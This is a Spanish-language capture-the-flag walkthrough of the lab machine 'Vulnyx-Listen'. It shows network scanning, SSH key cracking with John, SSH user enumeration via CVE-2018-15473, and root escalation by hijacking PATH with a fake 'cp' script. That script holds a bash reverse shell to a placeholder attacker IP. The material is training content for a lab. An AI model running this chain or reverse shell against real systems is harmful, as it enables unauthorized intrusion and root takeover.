# Vulnyx-Listen

## Identificación de la IP en la red
```bash
arp-scan -I eth0 --localnet
# (IP-victima)  08:00:27:30:e0:26       PCS Systemtechnik GmbH
```

## Escaneo de Puertos
```bash
nmap -p- --min-rate 2000 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap 
# 22/tcp   abierto    ssh     OpenSSH 7.7 (protocol 2.0)
# 8000/tcp abierto    http    SimpleHTTPServer 0.6 (Python 3.7.3)
```

Dentro del puerto 8000 encontramos una pista que nos indica que debemos escuchar. Utilizamos Wireshark para escanear la red y encontramos un archivo id_rsa.

Guardamos el id_rsa y procedemos a crackearlo.

## Crackeo de id_rsa
```bash
nano id_rsa
# [Pegamos el contenido]
# Es importante copiar el id_rsa como "Copy as Plain Text"

ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# Contraseña: i********w

chmod 600 id_rsa
```

Ahora que tenemos el id_rsa crackeado, procedemos a buscar usuarios. Encontramos un exploit CVE que enumera usuarios en SSH.

## Enumeración de Usuarios
```bash
python3 /home/kali/exploits/openssh/userenum7.7/CVE-2018-15473/CVE-2018-15473.py (IP-victima) -w /home/kali/wordlists666/names.txt
# abel is a valid username
```

Con los datos que tenemos, ingresamos vía SSH.

## Acceso SSH como Usuario
```bash
ssh -i id_rsa abel@(IP-victima)
# Contraseña: i*******w
```

Ya estamos dentro como `abel`, ahora realizamos el tratamiento de la TTY.

## Tratamiento de TTY
```bash
script /dev/null -c bash
export TERM=xterm
export SHELL=bash
```

Luego de explorar, encontramos un script que ejecuta `cp` como root.

## Exploración y Análisis del Cron Job
```bash
cat /etc/crontab
# SHELL=/bin/sh
# PATH=/usr/local/sbin:/dev/shm:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# * * * * * root cp /var/www/html/index.html /tmp

echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Podemos realizar un ataque de "path hijacking", pero hay un detalle más. El ataque no es al `$PATH`, sino que el script que ejecuta root va a un `$PATH` propio hecho para esta máquina.

Vamos a hacer una reverseshell con el nombre de `cp` e introducirla en el `$PATH`, específicamente en la ruta `/dev/shm`, ya que tenemos permisos de escritura.

## Creación de Reverseshell
```bash
cd /dev/shm

nano cp
# !/bin/bash

bash -i >& /dev/tcp/(IP-atacante)/443 0>&1

chmod 777 cp
# Damos todos los permisos a "cp"
```

Nos ponemos en escucha con netcat.

## Escucha para Reverseshell
```bash
nc -nlvp 443
# Esperamos aproximadamente un minuto
```

Y ya nos llega la reverseshell como root (:D).

## Verificación de Root
```bash
whoami
# root
```
